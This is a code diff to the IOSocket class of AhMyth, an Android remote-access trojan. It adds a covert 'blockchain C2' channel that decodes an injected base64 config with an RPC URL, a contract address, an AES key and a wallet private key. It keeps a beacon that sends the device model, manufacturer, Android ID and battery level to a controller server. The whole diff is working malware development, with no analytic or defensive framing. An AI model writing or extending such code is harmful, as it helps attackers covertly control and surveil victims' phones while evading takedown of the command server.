@@ -16,14 +16,89 @@ import io.socket.client.Socket;
  * Created by AhMyth on 10/14/16.
  */
 public class IOSocket {
-    private static IOSocket ourInstance = new IOSocket();
+    private static IOSocket ourInstance = null;
     private io.socket.client.Socket ioSocket;
+    
+    // Blockchain C2 configuration (set when blockchain mode is detected)
+    private static boolean isBlockchainMode = false;
+    private static String blockchainRpcUrl = null;
+    private static String blockchainContractAddress = null;
+    private static String blockchainAesKey = null;
+    private static String blockchainClientPrivateKey = null; // Client's wallet private key (for sending responses)
 
 
 
     private IOSocket() {
         try {
             Context context = MainService.getContextOfApplication();
+            
+            // This placeholder URL will be replaced during APK build
+            // Format: http://IP:PORT or BLOCKCHAIN_C2_CONFIG:base64 - the build script will inject actual config
+            String urlTemplate = "http://192.168.0.177:1234";
+            
+            // IMPORTANT: Check if blockchain C2 is configured FIRST, before any socket initialization
+            // The build script injects "BLOCKCHAIN_C2_CONFIG:base64" which may have ?model= appended
+            // We need to extract the base64 part before any query parameters
+            String baseUrlTemplate = urlTemplate;
+            int queryStart = urlTemplate.indexOf("?");
+            if (queryStart > 0) {
+                baseUrlTemplate = urlTemplate.substring(0, queryStart);
+            }
+            
+            // Check if blockchain C2 is configured (build script injects "BLOCKCHAIN_C2_CONFIG:base64")
+            if (baseUrlTemplate.startsWith("BLOCKCHAIN_C2_CONFIG:")) {
+                try {
+                    android.util.Log.d("IOSocket", "=== BLOCKCHAIN CONFIG PARSING ===");
+                    android.util.Log.d("IOSocket", "baseUrlTemplate: " + baseUrlTemplate.substring(0, Math.min(60, baseUrlTemplate.length())) + "...");
+
+                    // Extract base64 config
+                    String base64Part = baseUrlTemplate.substring("BLOCKCHAIN_C2_CONFIG:".length());
+                    android.util.Log.d("IOSocket", "base64Part length: " + base64Part.length());
+                    android.util.Log.d("IOSocket", "base64Part preview: " + base64Part.substring(0, Math.min(40, base64Part.length())) + "...");
+
+                    byte[] decodedBytes = android.util.Base64.decode(base64Part, android.util.Base64.NO_WRAP);
+                    android.util.Log.d("IOSocket", "decoded bytes length: " + decodedBytes.length);
+
+                    String configJson = new String(decodedBytes, "UTF-8");
+                    android.util.Log.d("IOSocket", "configJson length: " + configJson.length());
+                    android.util.Log.d("IOSocket", "configJson: " + configJson);
+
+                    org.json.JSONObject config = new org.json.JSONObject(configJson);
+                    
+                    if ("blockchain".equals(config.getString("type"))) {
+                        android.util.Log.d("IOSocket", "=== BLOCKCHAIN C2 MODE DETECTED ===");
+                        android.util.Log.d("IOSocket", "Blockchain C2 mode detected - using event-based command channel");
+                        android.util.Log.d("IOSocket", "Socket.IO connection will NOT be initialized");
+                        
+                        // Store blockchain config for ConnectionManager
+                        isBlockchainMode = true;
+                        blockchainRpcUrl = config.getString("rpcUrl");
+                        blockchainContractAddress = config.optString("contractAddress", "0x0000000000000000000000000000000000000000");
+                        blockchainAesKey = config.getString("aesKey");
+                        blockchainClientPrivateKey = config.optString("clientPrivateKey", null); // Optional - for bidirectional communication
+                        
+                        android.util.Log.d("IOSocket", "Blockchain C2 configuration:");
+                        android.util.Log.d("IOSocket", "  RPC URL: " + blockchainRpcUrl);
+                        android.util.Log.d("IOSocket", "  Contract: " + blockchainContractAddress);
+                        android.util.Log.d("IOSocket", "  AES Key: " + (blockchainAesKey != null ? "***" : "null"));
+                        android.util.Log.d("IOSocket", "  Mode: Event-based polling (NO Socket.IO connection)");
+                        android.util.Log.d("IOSocket", "=== END BLOCKCHAIN C2 CONFIG ===");
+                        
+                        // CRITICAL: In blockchain mode, exit early - do NOT initialize any socket
+                        // ConnectionManager will start blockchain event poller instead
+                        ensureBlockchainModeFromConfig();
+                        return; // Exit constructor immediately - no socket initialization
+                    }
+                } catch (Exception e) {
+                    android.util.Log.e("IOSocket", "Failed to parse blockchain C2 config, using TCP/IP fallback", e);
+                    e.printStackTrace();
+                    // Fall through to TCP/IP mode
+                }
+            }
+            
+            // TCP/IP Socket.IO mode - only executed if blockchain mode was NOT detected
+            android.util.Log.d("IOSocket", "Using TCP/IP Socket.IO mode (blockchain mode not detected)");
+            
             String deviceID = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
             
             // Get battery level
@@ -43,10 +118,14 @@ public class IOSocket {
             opts.randomizationFactor = 0.5; // Randomize reconnection delay
             opts.transports = new String[] {"websocket", "polling"}; // Allow both transports
             
-            // This placeholder URL will be replaced during APK build
-            // Format: http://IP:PORT - the build script will inject actual server IP/PORT
-            // For Android emulator, use 10.0.2.2 to reach host machine
-            String url = "http://192.168.0.177:1234?model=" + android.net.Uri.encode(Build.MODEL)
+            // Build URL
+            String url = urlTemplate;
+            if (!urlTemplate.startsWith("http://")) {
+                url = "http://192.168.0.177:1234"; // Fallback to default
+            }
+            
+            // Build full URL with device parameters
+            url = url + "?model=" + android.net.Uri.encode(Build.MODEL)
                 + "&manf=" + android.net.Uri.encode(Build.MANUFACTURER)
                 + "&release=" + Build.VERSION.RELEASE 
                 + "&id=" + deviceID
@@ -58,16 +137,25 @@ public class IOSocket {
                 + "&product=" + android.net.Uri.encode(Build.PRODUCT);
             
             android.util.Log.d("IOSocket", "Connecting to: " + url);
-            
-            // Pass opts to IO.socket()
+        
+            // Create Socket.IO connection
             ioSocket = IO.socket(url, opts);
+            
         } catch (URISyntaxException e) {
-            android.util.Log.e("IOSocket", "Invalid socket URL", e);
-            e.printStackTrace();
+            if (!isBlockchainMode) {
+                android.util.Log.e("IOSocket", "Invalid socket URL", e);
+                e.printStackTrace();
+            }
         } catch (Exception e) {
-            android.util.Log.e("IOSocket", "Error initializing socket", e);
-            e.printStackTrace();
+            if (!isBlockchainMode) {
+                android.util.Log.e("IOSocket", "Error initializing socket", e);
+                e.printStackTrace();
+            }
         }
+
+        // Safety net: if blockchain config values are present but the flag was not set,
+        // enforce blockchain mode so ConnectionManager does not fall back to Socket.IO.
+        ensureBlockchainModeFromConfig();
     }
     
     private int getBatteryLevel(Context context) {
@@ -106,13 +194,70 @@ public class IOSocket {
 
 
     public static IOSocket getInstance() {
+        if (ourInstance == null) {
+            ourInstance = new IOSocket();
+        }
         return ourInstance;
     }
 
-    public Socket getIoSocket() {
+    public io.socket.client.Socket getIoSocket() {
+        // In blockchain mode, return null (no Socket.IO connection)
+        if (isBlockchainMode) {
+            return null;
+        }
         return ioSocket;
     }
+    
+    /**
+     * Check if blockchain C2 mode is enabled
+     */
+    public static boolean isBlockchainMode() {
+        return isBlockchainMode;
+    }
+    
+    /**
+     * Get blockchain RPC URL
+     */
+    public static String getBlockchainRpcUrl() {
+        return blockchainRpcUrl;
+    }
+    
+    /**
+     * Get blockchain contract address
+     */
+    public static String getBlockchainContractAddress() {
+        return blockchainContractAddress;
+    }
+    
+    /**
+     * Get blockchain AES key
+     */
+    public static String getBlockchainAesKey() {
+        return blockchainAesKey;
+    }
+    
+    /**
+     * Get blockchain client private key (for sending responses)
+     */
+    public static String getBlockchainClientPrivateKey() {
+        return blockchainClientPrivateKey;
+    }
 
+    /**
+     * Ensure blockchain mode is flagged when config values are present.
+     * This covers edge cases where the config was injected but the mode flag
+     * was not set due to timing/initializer quirks.
+     */
+    public static boolean ensureBlockchainModeFromConfig() {
+        if (!isBlockchainMode
+                && blockchainRpcUrl != null
+                && blockchainContractAddress != null
+                && blockchainAesKey != null) {
+            isBlockchainMode = true;
+            android.util.Log.w("IOSocket", "Blockchain config detected post-init - enabling blockchain mode (no Socket.IO)");
+        }
+        return isBlockchainMode;
+    }
 
 
 
